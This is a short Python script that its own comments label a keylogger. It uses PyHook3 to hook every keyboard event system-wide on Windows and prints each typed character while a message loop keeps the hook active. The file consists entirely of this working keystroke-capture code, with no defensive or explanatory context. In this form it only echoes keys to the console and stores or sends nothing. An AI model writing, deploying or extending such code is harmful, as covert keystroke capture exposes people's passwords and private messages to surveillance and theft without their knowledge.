import PyHook3
import pythoncom



# Define a new function for the keylogger


def OnKeyboardEvent(event):
    print (chr(event.Ascii))
    return True

hm = PyHook3.HookManager()


#hook keyboard
hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
hm.HookKeyboard()

pythoncom.PumpMessages()

hm.UnhookKeyboard()



